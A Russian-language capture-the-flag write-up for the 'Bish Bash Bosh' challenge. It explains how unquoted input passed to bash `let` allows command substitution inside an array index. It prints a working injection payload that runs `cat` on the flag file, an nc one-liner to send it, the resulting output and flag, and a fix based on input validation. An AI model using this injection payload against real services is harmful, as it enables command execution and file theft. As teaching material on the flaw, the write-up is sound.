# Bish Bash Bosh (Misc)

## Задание

> *Let* me just quickly bash something together so you can't get my `/flag/flag.txt`.

TCP-сервис (socat) для каждого подключения запускает этот скрипт:

```bash
files=(
  "/flag/flag.txt"
  "msg1"
  "msg2"
  "msg3"
)

echo "What message would you like to see? (0..2)"
read -r i
let i=$i-1

if (( i < 1 || i > 3 )); then
  echo "Nuh uh"
  exit 1
fi

file="${files[i]}"
cat -- "$file"
```

Флаг — элемент 0 массива, а проверка диапазона блокирует индекс 0.

## Уязвимость

Курсивное *Let* в описании — подсказка. `let` вычисляет свой аргумент как **арифметическое выражение bash**, а наш ввод подставляется в него без кавычек.

В арифметике bash индекс массива вида `a[...]` тоже вычисляется, а подстановка команды `$(...)` внутри индекса выполняется. Значит, ввод — не просто число: он может выполнить команду ещё до проверки диапазона.

## Эксплуатация

Payload:

```
a[$(cat${IFS}/flag/flag.txt>&0)]
```

- `${IFS}` заменяет пробел (пробелы разбили бы аргумент).
- `>&0` отправляет вывод `cat` в файловый дескриптор 0. В socat `EXEC` stdin — это сетевой сокет, поэтому вывод сразу возвращается к нам.
- После этого скрипт всё равно печатает `Nuh uh`, но флаг уже отправлен.

```bash
printf '%s\n' 'a[$(cat${IFS}/flag/flag.txt>&0)]' | nc -N HOST 9000
```

Вывод:

```
What message would you like to see? (0..2)
PP{l3t_t00k_my_fl4g!!!::dtUQgusHeuoX}Nuh uh
```

Я проверил payload локально на копии скрипта и только потом один раз отправил его на цель.

## Флаг

`PP{l3t_t00k_my_fl4g!!!::dtUQgusHeuoX}`

## Вывод

Никогда не передавайте пользовательский ввод в `let`, `(( ))` или `$(( ))` в bash. Сначала проверьте его, например через `[[ $i =~ ^[0-9]+$ ]]`, и только потом выполняйте арифметику.
